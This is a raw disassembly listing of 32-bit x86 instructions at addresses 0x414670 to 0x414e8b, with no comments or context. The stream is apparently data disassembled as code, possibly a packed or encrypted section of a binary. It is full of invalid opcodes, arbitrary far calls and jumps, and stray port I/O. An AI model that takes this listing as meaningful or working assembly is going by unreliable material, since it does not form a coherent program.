  414670:	dec    ebx
  414671:	loope  0x4146e3
  414673:	mov    edx,0x175ee444
  414678:	xchg   esp,eax
  414679:	mov    ecx,0x1407df05
  41467e:	adc    bh,dl
  414680:	cli    
  414681:	xor    ebx,0x3c
  414684:	push   ss
  414685:	shr    DWORD PTR [ebx-0x140281a1],0x0
  41468c:	sahf   
  41468d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41468e:	test   edi,edx
  414690:	adc    al,0x94
  414692:	fstp   TBYTE PTR [esi+0x54d70ea7]
  414698:	aad    0x46
  41469a:	push   ss
  41469b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41469c:	add    ebx,DWORD PTR [edx-0x3339c806]
  4146a2:	iret   
  4146a3:	dec    ecx
  4146a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4146a5:	loope  0x4146fd
  4146a7:	imul   ebx,DWORD PTR [edx-0x67ba6b31],0x17
  4146ae:	fistp  QWORD PTR [edx+0x1c155b51]
  4146b4:	sub    eax,0x94434738
  4146b9:	push   ecx
  4146ba:	jne    0x414642
  4146bc:	sub    BYTE PTR es:[ecx],0x3a
  4146c0:	fsubr  QWORD PTR [ecx+ecx*8+0x128cab38]
  4146c7:	stc    
  4146c8:	ja     0x4146e6
  4146ca:	mov    esi,0xfe2b2789
  4146cf:	cmp    cl,BYTE PTR [eax-0x7ed5e93]
  4146d5:	or     al,0x2a
  4146d7:	mov    bl,0xdf
  4146d9:	xchg   edi,eax
  4146da:	pinsrw mm1,WORD PTR [ecx],0x72
  4146de:	pop    es
  4146df:	jg     0x414683
  4146e1:	adc    edx,ebx
  4146e3:	xchg   edx,eax
  4146e4:	mov    dh,0x8b
  4146e6:	cwde   
  4146e7:	inc    ecx
  4146e8:	lock cli 
  4146ea:	loopne 0x414686
  4146ec:	loopne 0x414708
  4146ee:	jae    0x4146ca
  4146f0:	ja     0x41475e
  4146f2:	xchg   DWORD PTR [edi-0x6b],esi
  4146f5:	sub    eax,0x8da325f3
  4146fa:	add    al,0xb8
  4146fc:	lahf   
  4146fd:	cmc    
  4146fe:	mov    bh,0x95
  414700:	jg     0x414739
  414702:	and    al,0xcf
  414704:	push   es
  414705:	(bad)  
  414706:	rcr    bl,1
  414708:	retf   0x7463
  41470b:	and    DWORD PTR [ebx+eiz*1+0xb598f2f],ebx
  414712:	loope  0x4146d5
  414714:	xor    eax,0x178ade74
  414719:	push   eax
  41471a:	xlat   BYTE PTR ds:[ebx]
  41471b:	cmp    DWORD PTR [ebp+0x31],0x875b80a
  414722:	arpl   sp,bp
  414724:	(bad)  
  414725:	imul   esp,DWORD PTR [edx],0x625bdecd
  41472b:	loopne 0x41476d
  41472d:	aaa    
  41472e:	or     esp,ebp
  414730:	shl    bh,cl
  414732:	mov    WORD PTR [ecx-0x47722ce3],es
  414738:	adc    al,0x1
  41473a:	mov    WORD PTR [ebp+0x3792bcea],cs
  414740:	scas   eax,DWORD PTR es:[edi]
  414741:	enter  0xe860,0x41
  414745:	sbb    BYTE PTR [edi],ah
  414747:	sbb    eax,0x19304a14
  41474c:	mov    eax,0x8c187133
  414751:	dec    ecx
  414752:	jae    0x4146f9
  414754:	dec    ecx
  414755:	test   DWORD PTR [eax+0x63],ebx
  414758:	popa   
  414759:	ss xor al,ch
  41475c:	sete   cl
  41475f:	xor    bh,BYTE PTR [esi+esi*2]
  414762:	mov    ch,0xac
  414764:	jne    0x414792
  414766:	inc    ebx
  414767:	adc    DWORD PTR [eax+0x24],edi
  41476a:	jae    0x414755
  41476c:	xor    ch,0x85
  41476f:	test   eax,0x348cbcf2
  414775:	jne    0x41477f
  414777:	mov    DWORD PTR [ecx],ecx
  414779:	adc    al,0xfc
  41477b:	push   es
  41477c:	arpl   di,cx
  41477e:	neg    BYTE PTR [ecx]
  414780:	jae    0x414740
  414782:	jle    0x414789
  414784:	sbb    eax,0x6f4dffc9
  414789:	sbb    al,0x4a
  41478b:	mov    dh,0xe4
  41478d:	xor    al,0x28
  41478f:	and    eax,0x5171ee2e
  414794:	fiadd  WORD PTR [edi+edi*4-0x51]
  414798:	push   edi
  414799:	sti    
  41479a:	cld    
  41479b:	mov    ah,0xae
  41479d:	mov    ds:0xc6d87f7f,al
  4147a2:	or     eax,0xd88c28d0
  4147a7:	jbe    0x414802
  4147a9:	add    eax,0x1f513545
  4147ae:	imul   esp,edi,0x5b
  4147b1:	int3   
  4147b2:	sub    eax,0xf2febcf6
  4147b7:	scas   eax,DWORD PTR es:[edi]
  4147b8:	(bad)  
  4147ba:	inc    edx
  4147bb:	xor    eax,0x593b376d
  4147c0:	jo     0x414744
  4147c2:	mov    bl,0xec
  4147c4:	clc    
  4147c5:	add    eax,0x67479e44
  4147ca:	push   0xe4d2b848
  4147cf:	jbe    0x41484d
  4147d1:	mov    eax,0xaeb1a26
  4147d6:	and    DWORD PTR [edx+0x6b1168fe],ecx
  4147dc:	sub    DWORD PTR [edi],ecx
  4147de:	mov    ebp,0xa9724e86
  4147e3:	cli    
  4147e4:	cmp    edx,esp
  4147e6:	dec    ebp
  4147e7:	cmc    
  4147e8:	xchg   edi,eax
  4147e9:	jmp    0x45e2b348
  4147ee:	push   edi
  4147ef:	inc    edx
  4147f0:	jle    0x414836
  4147f2:	push   eax
  4147f3:	sbb    BYTE PTR [edi+esi*1-0x5b581b5c],ch
  4147fa:	adc    edi,DWORD PTR [esi]
  4147fc:	pop    eax
  4147fd:	call   0xc987:0xbeb0778c
  414804:	stos   BYTE PTR es:[edi],al
  414805:	inc    edx
  414806:	inc    ebx
  414807:	xchg   al,ch
  414809:	(bad)  
  41480b:	(bad)  
  41480c:	sub    ch,BYTE PTR [edi-0x30]
  41480f:	pop    ebp
  414810:	(bad)  
  414812:	nop
  414813:	and    edi,ecx
  414815:	dec    ebp
  414816:	xchg   DWORD PTR [ecx+0x7a],ebp
  414819:	mov    dh,0x40
  41481b:	faddp  st(4),st
  41481d:	add    al,0x54
  41481f:	jg     0x414819
  414821:	iret   
  414822:	jbe    0x4147c3
  414824:	mov    ds:0x25c9d3db,al
  414829:	idiv   DWORD PTR [eax]
  41482b:	jmp    0x8a466a68
  414830:	retf   0xabbe
  414833:	mov    cl,0x54
  414835:	in     eax,0xd0
  414837:	outs   dx,DWORD PTR ds:[esi]
  414838:	push   ds
  414839:	std    
  41483a:	mov    dl,0xda
  41483c:	xor    eax,0x454db656
  414841:	xor    eax,0xe852a4a7
  414846:	push   ss
  414847:	rcr    eax,0x1c
  41484a:	dec    edx
  41484b:	pop    ebp
  41484c:	cli    
  41484d:	jbe    0x4147d0
  41484f:	test   BYTE PTR [esi-0x1e],0xa3
  414853:	xor    al,0x5a
  414855:	ja     0x41482f
  414857:	inc    ebx
  414858:	mov    BYTE PTR [ebx+ecx*1],0x27
  41485c:	xchg   esi,eax
  41485d:	or     eax,0x59270edf
  414862:	scas   eax,DWORD PTR es:[edi]
  414863:	and    al,dh
  414865:	push   0xffffffab
  414867:	imul   eax,DWORD PTR [eax+0x199a124b],0xe38823af
  414871:	sbb    BYTE PTR [edi+eax*8-0x52],ch
  414875:	inc    esp
  414876:	push   edx
  414877:	dec    ebx
  414878:	mov    edx,0xc0a4768b
  41487d:	js     0x414836
  41487f:	jp     0x4148c8
  414881:	std    
  414882:	enter  0x71e9,0x90
  414886:	jno    0x414819
  414888:	imul   eax,DWORD PTR [ebx-0x732ee2b7],0xa3cf74fb
  414892:	xlat   BYTE PTR ds:[ebx]
  414893:	mov    esi,0xa4413043
  414898:	push   ebx
  414899:	pop    ds
  41489a:	jge    0x4148cf
  41489c:	xchg   esp,eax
  41489d:	dec    esi
  41489e:	xchg   cl,bh
  4148a0:	repnz mov BYTE PTR [eax+ecx*8],dh
  4148a4:	lods   eax,DWORD PTR ds:[esi]
  4148a5:	or     ebx,ecx
  4148a7:	adc    ebx,edi
  4148a9:	out    dx,eax
  4148aa:	cmc    
  4148ab:	fadd   QWORD PTR [eax]
  4148ae:	sbb    DWORD PTR [ecx-0x7f],ebx
  4148b1:	int3   
  4148b2:	ss and eax,0xf0f8d704
  4148b8:	pop    ds
  4148b9:	mov    ch,BYTE PTR [edi+0xf26ec6f]
  4148bf:	sar    BYTE PTR [esi-0x29],1
  4148c2:	aad    0xed
  4148c4:	push   ebx
  4148c5:	js     0x4148a6
  4148c7:	inc    edi
  4148c8:	sub    al,0x31
  4148ca:	lss    ecx,FWORD PTR [ebp+0x1f]
  4148ce:	ja     0x4148b6
  4148d0:	(bad)  
  4148d1:	cmp    edi,DWORD PTR [edi]
  4148d3:	call   0xbdef:0x71da3770
  4148da:	sbb    cl,dl
  4148dc:	fidiv  WORD PTR [ebx]
  4148de:	push   ebx
  4148df:	repnz mov eax,ds:0x35cf485d
  4148e5:	inc    ebp
  4148e6:	loopne 0x4148e1
  4148e8:	mov    dh,0x2a
  4148ea:	nop
  4148eb:	sbb    edx,DWORD PTR [edx]
  4148ed:	inc    ebx
  4148ee:	jle    0x414967
  4148f0:	(bad)  
  4148f1:	xor    DWORD PTR [esi],edx
  4148f3:	es cmp al,0x67
  4148f6:	mov    ah,bl
  4148f8:	add    eax,edx
  4148fa:	inc    esp
  4148fb:	repz or al,0xf4
  4148fe:	not    esi
  414900:	cmp    eax,0x1827ce16
  414906:	in     eax,dx
  414907:	add    al,0x78
  414909:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41490a:	mov    BYTE PTR [ecx-0x71ae9b03],dh
  414910:	fisub  DWORD PTR [edx+edx*8+0x2b836ea3]
  414917:	jns    0x414944
  414919:	in     al,0xbb
  41491b:	add    BYTE PTR [edx+0x247cc11a],bh
  414921:	add    esp,ecx
  414923:	mov    eax,0xd4fffff8
  414928:	shr    BYTE PTR [ebx+0x38],1
  41492b:	and    al,0xc5
  41492d:	cmp    al,BYTE PTR [eax]
  41492f:	test   eax,0x15750d9d
  414934:	aam    0xc8
  414936:	mov    ah,0x57
  414938:	jg     0x4148be
  41493a:	sub    esp,edi
  41493c:	das    
  41493d:	mov    ebp,DWORD PTR ds:0xe902c4af
  414943:	add    eax,0x2649d67a
  414948:	xchg   edi,eax
  414949:	dec    ebp
  41494a:	xchg   DWORD PTR [esp+eiz*4-0x7c],edi
  41494e:	rcr    BYTE PTR [edx+ebx*2+0x44],1
  414952:	sahf   
  414953:	jmp    0x4148f5
  414955:	sub    BYTE PTR [ebp+0x7d],ch
  414958:	test   DWORD PTR [eax],esp
  41495a:	ret    0x80
  41495d:	jae    0x4148f8
  41495f:	(bad)  
  414960:	mov    edi,0xeedc3636
  414965:	out    dx,al
  414966:	ret    
  414967:	mov    BYTE PTR [esi+0x6775232e],ah
  41496d:	push   cs
  41496e:	setb   BYTE PTR [eax+0x78578549]
  414975:	sbb    bl,dh
  414977:	js     0x414941
  414979:	pop    ss
  41497a:	inc    ebp
  41497b:	imul   eax,DWORD PTR ds:0xe160,0x9cf1e3bf
  414984:	aad    0x4
  414986:	shl    DWORD PTR [edi+ebx*8],0xdf
  41498a:	mov    ebx,0xe113b544
  41498f:	(bad)  
  414992:	mov    ebp,0x1702b0ef
  414997:	pop    ds
  414998:	sbb    DWORD PTR ds:[edx*1+0x186d10f1],ebp
  4149a0:	fsub   DWORD PTR [ebx]
  4149a2:	and    al,0x6
  4149a4:	out    0x52,al
  4149a6:	and    eax,0xa31ed9b0
  4149ab:	pop    esi
  4149ac:	imul   esp,DWORD PTR [ebp+0x4dafcab9],0xf8b3a3e2
  4149b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4149b7:	xor    ch,BYTE PTR [edi+eax*1+0x29936e7d]
  4149be:	js     0x414953
  4149c0:	add    BYTE PTR [ecx+0x2405633c],bl
  4149c6:	add    bh,cl
  4149c8:	sbb    BYTE PTR [ecx-0x2a],0x59
  4149cc:	cmp    bl,ah
  4149ce:	cmc    
  4149cf:	ror    DWORD PTR [edi-0x60801cee],1
  4149d5:	sub    eax,0x998055da
  4149da:	out    0xd5,al
  4149dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4149dd:	and    eax,0xeeb96761
  4149e2:	and    eax,0xa540e175
  4149e7:	sbb    edi,ebp
  4149e9:	dec    ecx
  4149ea:	popa   
  4149eb:	fldenv [edx+0x66aed287]
  4149f1:	dec    DWORD PTR [edi]
  4149f3:	add    ah,BYTE PTR [edi+edx*2-0xd]
  4149f7:	sub    eax,0x1f294012
  4149fc:	scas   eax,DWORD PTR es:[edi]
  4149fd:	xchg   esi,eax
  4149fe:	jb     0x414a77
  414a00:	jb     0x4149a1
  414a02:	pop    es
  414a03:	jp     0x414a65
  414a05:	loop   0x414a62
  414a07:	or     ebx,DWORD PTR [edi]
  414a09:	and    cl,BYTE PTR [edi+0x1b]
  414a0c:	mov    ebp,0x8e6801e0
  414a11:	repnz (bad) 
  414a13:	mov    bh,BYTE PTR [edi]
  414a15:	jecxz  0x414a50
  414a17:	mov    ds:0xec3f089d,eax
  414a1c:	icebp  
  414a1d:	emms   
  414a1f:	jno    0x4149d3
  414a21:	xor    edi,ebp
  414a23:	aas    
  414a24:	cmp    edx,0x50294985
  414a2a:	push   ds
  414a2b:	sahf   
  414a2c:	call   0xd40f5dba
  414a31:	inc    edi
  414a32:	jge    0x414a03
  414a34:	add    ecx,DWORD PTR [ebx]
  414a36:	out    0x2b,eax
  414a38:	mov    esi,0x7a08f82e
  414a3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a3e:	push   cs
  414a3f:	lea    esi,[ebp-0x2d]
  414a42:	fld    DWORD PTR [ecx]
  414a44:	mov    eax,ds:0x1272f524
  414a49:	or     BYTE PTR [edx+ebp*1+0x51],al
  414a4d:	retf   
  414a4e:	dec    ebx
  414a4f:	out    0x81,al
  414a51:	call   0xcdaf:0x13f51742
  414a58:	(bad)  
  414a59:	repz xchg esi,eax
  414a5b:	pop    esi
  414a5c:	mov    eax,0xa50fa36
  414a61:	cmp    esp,DWORD PTR [eax]
  414a63:	call   0xf494a7b8
  414a68:	and    al,0x49
  414a6a:	mov    eax,ds:0x9fcd0dcc
  414a6f:	xchg   BYTE PTR [eax],bh
  414a71:	sbb    bl,cl
  414a73:	or     eax,0xce748d2f
  414a78:	pop    es
  414a79:	adc    eax,0xc5d94958
  414a7e:	adc    BYTE PTR [ecx],dl
  414a80:	repz cmp al,0xbb
  414a83:	ret    
  414a84:	inc    ecx
  414a85:	jle    0x414a95
  414a87:	xor    BYTE PTR [edi+0xa3a15b],dl
  414a8d:	pop    ecx
  414a8e:	mov    ds:0x279d90c8,eax
  414a93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a94:	pushf  
  414a95:	cmp    cl,ch
  414a97:	push   ss
  414a98:	fild   QWORD PTR [esi]
  414a9a:	mov    bl,bh
  414a9c:	out    dx,eax
  414a9d:	je     0x414af1
  414a9f:	test   bh,dh
  414aa1:	sbb    eax,DWORD PTR [ebx]
  414aa3:	pop    ebx
  414aa4:	adc    al,BYTE PTR [edx-0x1a8338d5]
  414aaa:	mov    edx,0x3c34220c
  414aaf:	cmp    BYTE PTR [eax+edx*2],bh
  414ab2:	xchg   esp,eax
  414ab3:	mov    esi,0x6ecdd270
  414ab8:	mov    bl,0xb5
  414aba:	js     0x414a7e
  414abc:	jns    0x414b23
  414abe:	and    ebp,DWORD PTR [edi]
  414ac0:	xchg   ebp,eax
  414ac1:	and    BYTE PTR [edx],al
  414ac3:	add    eax,0x71afa8e5
  414ac8:	aas    
  414ac9:	mov    bl,0xab
  414acb:	jmp    0x414b11
  414acd:	cwde   
  414ace:	outs   dx,BYTE PTR ds:[esi]
  414acf:	out    dx,al
  414ad0:	jns    0x414aed
  414ad2:	lods   al,BYTE PTR ds:[esi]
  414ad3:	jge    0x414b0e
  414ad5:	lds    ebp,FWORD PTR [edx]
  414ad7:	call   0x16a1fc8
  414adc:	outs   dx,BYTE PTR ds:[esi]
  414add:	and    eax,edx
  414adf:	or     al,0x5c
  414ae1:	mov    gs,WORD PTR [eax+0x67e7519a]
  414ae7:	pusha  
  414ae8:	xchg   esi,eax
  414ae9:	jbe    0x414b0e
  414aeb:	push   ds
  414aec:	retf   
  414aed:	test   eax,0x7b082dfd
  414af2:	ja     0x414a7f
  414af4:	jae    0x414b00
  414af6:	fisubr WORD PTR [esi+0x23]
  414af9:	mov    ebp,0xd862448c
  414afe:	mov    ds:0xad8beb13,al
  414b03:	xchg   eax,esi
  414b05:	xchg   ebx,eax
  414b06:	inc    ebx
  414b07:	js     0x414b31
  414b09:	ds sbb al,0x34
  414b0c:	fstp   DWORD PTR [eax+0x4e0a9ede]
  414b12:	push   ebp
  414b13:	or     eax,0xc5a9f460
  414b18:	mov    al,0x7f
  414b1a:	and    eax,0xb1dd04d5
  414b1f:	push   edi
  414b20:	cs in  al,dx
  414b22:	pop    edi
  414b23:	int    0x4f
  414b25:	push   0x22
  414b27:	fsub   DWORD PTR [ecx-0x282e6bfb]
  414b2d:	daa    
  414b2e:	or     DWORD PTR [edi],ebp
  414b30:	or     al,0xa8
  414b32:	or     eax,0xdf7bf8da
  414b37:	pop    esi
  414b38:	fadd   QWORD PTR [eax-0x7746315a]
  414b3e:	xor    DWORD PTR [edi+0x30],ebx
  414b41:	sub    bh,BYTE PTR [esi]
  414b43:	sub    esp,eax
  414b45:	das    
  414b46:	arpl   WORD PTR [eax],cx
  414b48:	pop    ebp
  414b49:	lods   eax,DWORD PTR ds:[esi]
  414b4a:	sbb    eax,DWORD PTR [ebx+0xa09f7a5]
  414b50:	mov    DWORD PTR [edi*8-0x52db710c],0xb333fb3d
  414b5b:	inc    ebx
  414b5c:	dec    esp
  414b5d:	(bad)  
  414b5e:	push   ecx
  414b5f:	dec    esp
  414b60:	push   ss
  414b61:	and    DWORD PTR fs:[esi+edi*1+0x477a756d],ecx
  414b69:	adc    BYTE PTR [edx],al
  414b6b:	pop    esi
  414b6c:	jns    0x414b19
  414b6e:	and    ah,bl
  414b70:	cmp    BYTE PTR [edi],ah
  414b72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b73:	out    dx,al
  414b74:	into   
  414b75:	jne    0x414b0e
  414b77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b78:	adc    dh,BYTE PTR [eax+ecx*8-0x2d]
  414b7c:	or     dl,ah
  414b7e:	cmp    BYTE PTR [esi-0x5a],bh
  414b81:	aam    0xdb
  414b83:	(bad)  
  414b84:	hlt    
  414b85:	sti    
  414b86:	xor    esi,ebp
  414b88:	pop    esi
  414b8a:	js     0x414ba5
  414b8c:	jbe    0x414b26
  414b8e:	std    
  414b8f:	iret   
  414b90:	mov    al,ds:0x9c48c978
  414b95:	sbb    al,0x62
  414b97:	out    dx,eax
  414b98:	add    esp,DWORD PTR [ecx-0x69d73e20]
  414b9e:	imul   ebp,DWORD PTR [ebp-0x61],0xaa5c5a84
  414ba5:	cmp    al,0x9e
  414ba7:	clc    
  414ba8:	add    eax,0x78b059f1
  414bad:	es or  ecx,0x48
  414bb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414bb2:	(bad)  
  414bb3:	int    0xbd
  414bb5:	fld1   
  414bb7:	sbb    eax,0x4941e845
  414bbc:	pop    ss
  414bbd:	fcmovb st,st(1)
  414bbf:	aad    0x56
  414bc1:	jnp    0x414c3f
  414bc3:	push   es
  414bc4:	fwait
  414bc5:	sti    
  414bc6:	je     0x414bec
  414bc8:	push   eax
  414bc9:	or     eax,0x632f1cca
  414bce:	mov    ah,0xe1
  414bd0:	std    
  414bd1:	shl    dl,0xd1
  414bd4:	add    ebp,DWORD PTR [ecx]
  414bd6:	test   bh,cl
  414bd8:	fmul   QWORD PTR ds:0x48965ba3
  414bde:	mov    edx,0xdcb2f496
  414be3:	xor    ah,dl
  414be5:	adc    eax,edx
  414be7:	ins    DWORD PTR es:[edi],dx
  414be8:	adc    eax,DWORD PTR [ebx]
  414bea:	jmp    0x1a9ca852
  414bef:	rol    BYTE PTR [ecx],1
  414bf1:	dec    esi
  414bf2:	test   eax,0xce0a559e
  414bf7:	jg     0x414bb6
  414bf9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414bfa:	or     BYTE PTR [edi-0x7560aff],0x42
  414c01:	jbe    0x414ba9
  414c03:	mov    eax,0x10b40f9b
  414c08:	xor    BYTE PTR [edi],0xca
  414c0b:	xchg   esp,eax
  414c0c:	mov    ch,0xd8
  414c0e:	in     al,0x78
  414c10:	retf   
  414c11:	aas    
  414c12:	mov    es,WORD PTR [edi]
  414c14:	add    al,0x74
  414c16:	test   DWORD PTR [ebp+0x75],esp
  414c19:	mov    al,0x80
  414c1b:	add    al,0x61
  414c1d:	sar    BYTE PTR [edi+edx*2+0x72edc4b1],0xb2
  414c25:	mov    dl,0xc6
  414c27:	sub    DWORD PTR [eax],ebx
  414c29:	pushf  
  414c2a:	push   eax
  414c2b:	sub    al,0x41
  414c2d:	imul   esi,DWORD PTR [eax+0x30],0x163602b6
  414c34:	ins    DWORD PTR es:[edi],dx
  414c35:	xor    al,0x2d
  414c37:	sbb    DWORD PTR ds:0x6b72ccce,esp
  414c3d:	push   edi
  414c3e:	scas   eax,DWORD PTR es:[edi]
  414c3f:	ret    
  414c40:	and    eax,0x7c7c6720
  414c45:	xchg   esp,eax
  414c46:	pop    esi
  414c47:	pop    eax
  414c48:	hlt    
  414c49:	sbb    eax,0xded6270e
  414c4e:	gs push cs
  414c50:	mov    ecx,0x5dd77bbb
  414c55:	int    0xb2
  414c57:	div    dl
  414c59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c5a:	or     al,0x4a
  414c5c:	outs   dx,BYTE PTR ds:[esi]
  414c5d:	xor    DWORD PTR [esi+edx*1-0x501eba51],eax
  414c64:	aas    
  414c65:	jecxz  0x414cd0
  414c67:	lea    esp,[eax+eax*8-0x15]
  414c6b:	and    al,0x95
  414c6d:	jnp    0x414c68
  414c6f:	and    BYTE PTR [ecx],0x8
  414c72:	pop    esi
  414c73:	rol    BYTE PTR [ebp-0x25b6b833],0x48
  414c7a:	mov    BYTE PTR [edi-0x50],dl
  414c7d:	(bad)  
  414c7e:	mov    eax,ds:0xb439374f
  414c83:	add    al,0x58
  414c85:	imul   eax,DWORD PTR ds:0xe113d33c,0x5ed87750
  414c8f:	add    eax,0x8435eb0b
  414c94:	push   esp
  414c95:	dec    edi
  414c96:	hlt    
  414c97:	pop    es
  414c98:	or     ebp,esp
  414c9a:	in     eax,dx
  414c9b:	int    0x6
  414c9d:	es jecxz 0x414d15
  414ca0:	mov    ch,0x8a
  414ca2:	popa   
  414ca3:	loop   0x414cec
  414ca5:	add    eax,0x9dc0b327
  414caa:	jnp    0x414c35
  414cac:	aad    0x2e
  414cae:	stc    
  414caf:	ds pop esi
  414cb1:	jp     0x414c74
  414cb3:	dec    ebx
  414cb4:	mov    gs,WORD PTR [edx+0x2445c208]
  414cba:	call   0xd1e3:0x2c9f35b0
  414cc1:	dec    ebx
  414cc2:	dec    edi
  414cc3:	mov    WORD PTR [ebp+0x32],ss
  414cc6:	outs   dx,DWORD PTR ds:[esi]
  414cc7:	mov    esp,0x4e282c84
  414ccc:	jmp    0x791db519
  414cd1:	and    bl,BYTE PTR [esi]
  414cd3:	test   BYTE PTR [ecx],al
  414cd5:	ins    BYTE PTR es:[edi],dx
  414cd6:	lds    ebx,FWORD PTR [ebp+0xe]
  414cd9:	std    
  414cda:	int3   
  414cdb:	pop    esi
  414cdc:	cli    
  414cdd:	cld    
  414cde:	inc    ecx
  414cdf:	fcmovbe st,st(2)
  414ce2:	sbb    esi,DWORD PTR [ebx+0xd]
  414ce5:	loopne 0x414d0d
  414ce7:	and    DWORD PTR [eax+0x17],0xffffffc1
  414ceb:	arpl   WORD PTR [ebx+0x21b796f],di
  414cf1:	into   
  414cf2:	mov    ch,0xc4
  414cf4:	mov    esp,0x234058ad
  414cf9:	sub    DWORD PTR ds:0xa502df1d,ecx
  414cff:	cmp    BYTE PTR [ebp+0x593af258],al
  414d05:	aaa    
  414d06:	std    
  414d07:	mov    al,0x69
  414d09:	sbb    BYTE PTR [esi-0x54],cl
  414d0c:	dec    esp
  414d0d:	retf   
  414d0e:	and    bh,BYTE PTR [ebx+0x101eab6d]
  414d14:	mov    dl,0x7b
  414d16:	out    0x5e,eax
  414d18:	out    dx,al
  414d19:	stos   DWORD PTR es:[edi],eax
  414d1a:	not    bh
  414d1c:	push   esp
  414d1d:	loope  0x414d7d
  414d1f:	pushf  
  414d20:	pop    ebp
  414d21:	sbb    eax,0x340b4a0f
  414d26:	fld    QWORD PTR [ebp+0x38]
  414d29:	stc    
  414d2a:	aad    0xbc
  414d2c:	add    DWORD PTR [esi+0x21],esi
  414d2f:	adc    DWORD PTR [edx],ecx
  414d31:	fmul   DWORD PTR ds:0x1ff38603
  414d37:	ror    BYTE PTR [eax],1
  414d39:	mov    eax,0xb289d25b
  414d3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d3f:	aas    
  414d40:	icebp  
  414d41:	inc    edx
  414d42:	xchg   DWORD PTR [ebx+0x5e260891],eax
  414d48:	punpckhbw mm0,QWORD PTR [eax-0x43]
  414d4c:	cs mov di,0xb5f5
  414d51:	out    0x12,al
  414d53:	in     al,0xcd
  414d55:	jne    0x414ceb
  414d57:	clc    
  414d58:	(bad)  
  414d5a:	inc    esp
  414d5b:	std    
  414d5c:	into   
  414d5d:	int3   
  414d5e:	std    
  414d5f:	leave  
  414d60:	mov    WORD PTR [eax+esi*4-0x1238aead],ds
  414d67:	pop    ebp
  414d68:	xchg   ecx,eax
  414d69:	and    al,al
  414d6b:	xchg   DWORD PTR [ebp-0x568a930a],ebx
  414d71:	cdq    
  414d72:	mov    WORD PTR [ecx+0x10607fbf],es
  414d78:	ss mov bh,0xe0
  414d7b:	xchg   ecx,eax
  414d7c:	mov    ebp,0x28c0544
  414d81:	mov    esi,0x9ed9fa12
  414d86:	xchg   edx,eax
  414d87:	jbe    0x414d18
  414d89:	leave  
  414d8a:	mov    al,ds:0x134dafd2
  414d8f:	lea    esp,[edi]
  414d91:	lahf   
  414d92:	fimul  DWORD PTR gs:[ebx]
  414d95:	mov    ebp,0x90d52861
  414d9a:	jg     0x414d2e
  414d9c:	into   
  414d9d:	mov    al,ds:0x5d6c7463
  414da2:	jo     0x414d3d
  414da4:	es sub eax,0x139c934d
  414daa:	es pop esi
  414dac:	and    al,0xbf
  414dae:	js     0x414df1
  414db0:	fstp   TBYTE PTR [ebx-0x1]
  414db3:	sbb    BYTE PTR [ebx-0x6f042c4f],0x8f
  414dba:	je     0x414e09
  414dbc:	loop   0x414db1
  414dbe:	fxch   st(7)
  414dc0:	xchg   esi,eax
  414dc1:	or     eax,0x897038df
  414dc6:	push   edi
  414dc7:	or     DWORD PTR [esi+0x48],esi
  414dca:	ins    BYTE PTR es:[edi],dx
  414dcb:	adc    ch,bl
  414dcd:	and    BYTE PTR [ecx],dl
  414dcf:	sub    BYTE PTR [ebp+esi*1-0x2d],0xad
  414dd4:	lahf   
  414dd5:	cld    
  414dd6:	(bad)  
  414dd7:	mov    ds:0x1e923d63,al
  414ddc:	push   ebx
  414ddd:	pop    ebp
  414dde:	int    0x1f
  414de0:	jae    0x414e5f
  414de2:	dec    ebx
  414de3:	leave  
  414de4:	sbb    eax,DWORD PTR [eax-0x6a]
  414de7:	xchg   edi,eax
  414de8:	dec    esp
  414de9:	in     al,dx
  414dea:	sub    bl,BYTE PTR [eax+0x5cb444bb]
  414df0:	ins    BYTE PTR es:[edi],dx
  414df1:	pop    ds
  414df2:	cld    
  414df3:	dec    ebp
  414df4:	inc    edi
  414df5:	inc    ebp
  414df6:	inc    eax
  414df7:	cmc    
  414df8:	push   0xc2fb2756
  414dfd:	scas   al,BYTE PTR es:[edi]
  414dfe:	mov    ds:0x12bcec43,eax
  414e03:	cmp    BYTE PTR [ebp+0x44c9b13c],dh
  414e09:	loopne 0x414e44
  414e0b:	push   esi
  414e0c:	sub    DWORD PTR [ebp+ebp*4-0x7868ef10],edi
  414e13:	and    ah,ah
  414e15:	jnp    0x414e6d
  414e17:	das    
  414e18:	fst    QWORD PTR [esi]
  414e1a:	push   eax
  414e1b:	arpl   WORD PTR [esi+0x6ea48889],cx
  414e21:	clc    
  414e22:	scas   al,BYTE PTR es:[edi]
  414e23:	fnstsw WORD PTR [eax+0x57]
  414e26:	mov    ecx,0x57b6c4eb
  414e2b:	retf   
  414e2c:	mov    ds,ecx
  414e2e:	hlt    
  414e2f:	sbb    al,0x8c
  414e31:	pop    ecx
  414e32:	mov    edx,0xc820941a
  414e37:	(bad)  
  414e38:	stc    
  414e39:	mul    BYTE PTR [ebx-0x2c8f8ac]
  414e3f:	adc    DWORD PTR [ebp-0x3331b475],ebx
  414e45:	repz loop 0x414e66
  414e48:	dec    ebx
  414e49:	cmp    ebp,0x7e53a3d3
  414e4f:	call   0xb3da282d
  414e54:	add    esi,0xffffffe1
  414e57:	adc    eax,0x689e538f
  414e5c:	in     eax,dx
  414e5d:	(bad)  
  414e5e:	xor    eax,0x9a20cab5
  414e63:	in     eax,0x7
  414e65:	aam    0x4f
  414e67:	jbe    0x414e26
  414e69:	mov    esi,0x45653301
  414e6e:	fidiv  WORD PTR [ebx-0x7a88da86]
  414e74:	stos   DWORD PTR es:[edi],eax
  414e75:	bound  esi,QWORD PTR [eax-0x26]
  414e78:	ins    BYTE PTR es:[edi],dx
  414e79:	cmp    eax,0x89986f43
  414e7e:	and    DWORD PTR [edi+0x4e],0xffffffd6
  414e82:	add    edi,edx
  414e84:	ret    0x14fb
  414e87:	repnz xor dl,BYTE PTR [edx-0x37]
  414e8b:	shl    ecx,1
